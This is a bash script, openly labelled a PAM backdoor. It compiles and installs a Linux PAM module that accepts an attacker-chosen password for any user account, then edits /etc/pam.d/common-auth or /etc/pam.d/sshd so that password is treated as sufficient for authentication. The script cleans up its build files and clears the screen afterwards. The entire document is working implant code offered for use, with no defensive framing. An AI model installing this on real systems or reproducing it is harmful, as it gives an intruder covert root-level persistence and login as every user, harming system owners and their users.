#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] PAM Backdoor [*] "
echo ""

command -v gcc >/dev/null 2>&1 || { echo "[ERROR] gcc not found. Install with: apt install gcc" >&2; exit 1; }

# Check for PAM development headers
if [ ! -f /usr/include/security/pam_modules.h ]; then
    echo "[*] Installing PAM development headers..."
    apt-get install -y libpam0g-dev 2>/dev/null
fi

read -p "Enter the backdoor password: " backdoor_pass

if [ -z "$backdoor_pass" ]; then
    echo "[ERROR] Password cannot be empty." >&2
    exit 1
fi

TMPDIR=$(mktemp -d)

cat > "$TMPDIR/pam_backdoor.c" <<'SRCEOF'
#include <stdio.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

#define BACKDOOR_PASS "___BACKDOOR_PASS___"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;

    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (password != NULL && strcmp(password, BACKDOOR_PASS) == 0) {
        return PAM_SUCCESS;
    }

    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
SRCEOF

# Substitute the actual password into the source
sed -i "s|___BACKDOOR_PASS___|$backdoor_pass|g" "$TMPDIR/pam_backdoor.c"

# Detect the correct security module directory
if [ -d "/lib/x86_64-linux-gnu/security" ]; then
    PAM_DIR="/lib/x86_64-linux-gnu/security"
elif [ -d "/lib/security" ]; then
    PAM_DIR="/lib/security"
elif [ -d "/lib64/security" ]; then
    PAM_DIR="/lib64/security"
else
    PAM_DIR="/lib/security"
    mkdir -p "$PAM_DIR"
fi

echo "[*] Compiling PAM module..."
gcc -shared -fPIC -o "$TMPDIR/pam_backdoor.so" "$TMPDIR/pam_backdoor.c" -lpam 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[ERROR] Compilation failed." >&2
    rm -rf "$TMPDIR"
    exit 1
fi

echo "[*] Installing PAM module to $PAM_DIR/"
cp "$TMPDIR/pam_backdoor.so" "$PAM_DIR/pam_backdoor.so"
chmod 644 "$PAM_DIR/pam_backdoor.so"

# Backup and modify PAM config
PAM_CONF="/etc/pam.d/common-auth"
if [ -f "$PAM_CONF" ]; then
    cp "$PAM_CONF" "${PAM_CONF}.bak"
    # Insert our module before pam_unix.so
    if ! grep -q "pam_backdoor.so" "$PAM_CONF"; then
        sed -i '/pam_unix\.so/i auth sufficient pam_backdoor.so' "$PAM_CONF"
    fi
else
    # Fallback: modify sshd PAM config
    PAM_CONF="/etc/pam.d/sshd"
    if [ -f "$PAM_CONF" ]; then
        cp "$PAM_CONF" "${PAM_CONF}.bak"
        if ! grep -q "pam_backdoor.so" "$PAM_CONF"; then
            sed -i '1a auth sufficient pam_backdoor.so' "$PAM_CONF"
        fi
    fi
fi

# Clean up build artifacts
rm -rf "$TMPDIR"

clear

echo "[*] Success!! PAM Backdoor has been implanted. [*]"
echo "[*] Module: $PAM_DIR/pam_backdoor.so [*]"
echo "[*] Config: $PAM_CONF [*]"
echo "[*] You can now authenticate as any user with the backdoor password. [*]"

sleep 2

clear
